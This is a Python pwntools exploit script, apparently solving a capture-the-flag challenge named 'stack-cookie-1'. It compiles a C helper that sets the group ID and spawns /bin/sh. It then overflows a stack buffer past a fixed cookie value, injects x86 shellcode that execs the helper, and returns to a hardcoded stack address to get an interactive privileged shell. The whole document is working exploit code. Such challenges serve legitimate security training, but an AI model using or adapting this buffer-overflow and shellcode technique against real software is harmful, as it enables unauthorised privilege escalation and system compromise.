from pwn import *
import os

DEBUG = False 
file = "./stack-cookie-1"
env = {"PATH":"$PATH:."}

c_code = '''
#include <unistd.h>

int main(){
    setregid(getegid(), getegid());
    execve("/bin/sh", 0, 0);
}
'''

with open("payload.c", "w") as f:
    f.write(c_code)

os.system("gcc -o z payload.c")

max_len = 0x88 - 0x4

io = process(file, env)
payload = cyclic(1000)
payload = payload.replace(payload[max_len:max_len + 4], p32(0xfaceb00c))
io.send(payload)
io.wait()
core = io.corefile
buffer_addr = core.stack.find(cyclic(0x84))
print("buf_addr:", hex(buffer_addr))
os.unlink(core.path)

# launch the main process (still boilerplate)
if DEBUG:
    context.log_level = 'DEBUG'
    context.terminal = ['tmux', 'splitw', '-h']
    io = gdb.debug(file, env=env, gdbscript='''
b *0x8048537
continue
''')

else:
    io = process(file, env=env)


# END SETUP BOILERPLATE
# BEGIN CHALLENGE-SPECIFIC CODE
shellcode = asm('''
xor ecx, ecx
xor edx, edx

push 0x7a
mov ebx, esp

mov eax, 0xb
int 0x80
''')

payload = shellcode + b"A" * (max_len - len(shellcode)) + p32(0xfaceb00c) + b"A" * 4 + p32(0xffffdd70)
io.sendline(payload)
io.interactive()


# END CHALLENGE-SPECIFIC CODE
# BEGIN FLAG RETRIEVAL BOILERPLATE

# import re
# io.sendlineafter(b'Spawning a privileged shell', b'cat flag')
# flag = re.search(br'candl\{[ -z|~]*}', io.recvregex(br'candl\{[ -z|~]*}')).group(0)
# print(flag)
